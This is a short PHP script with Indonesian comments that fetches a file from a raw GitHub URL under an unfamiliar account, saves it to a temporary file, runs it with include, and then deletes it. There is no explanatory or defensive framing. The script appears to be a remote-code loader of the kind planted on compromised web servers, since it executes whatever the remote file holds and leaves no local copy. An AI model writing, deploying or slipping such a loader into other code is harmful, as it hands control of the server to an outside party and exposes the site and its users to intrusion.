<?php
$url = "https://raw.githubusercontent.com/abcwhite2388/nnniiitest/main/a";  // Ganti dengan URL yang diinginkan

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);

if ($result === false) {
    echo "Error: " . "PD9waHA=" . curl_error($ch);
} else {
    // Simpan hasil dari URL ke dalam file lokal
    $tempFile = tempnam(sys_get_temp_dir(), 'pasted_code_');
    file_put_contents($tempFile, $result);

    // Include file yang telah diunduh dari URL
    include $tempFile;

    // Hapus file sementara setelah dieksekusi
    unlink($tempFile);
}
curl_close($ch);

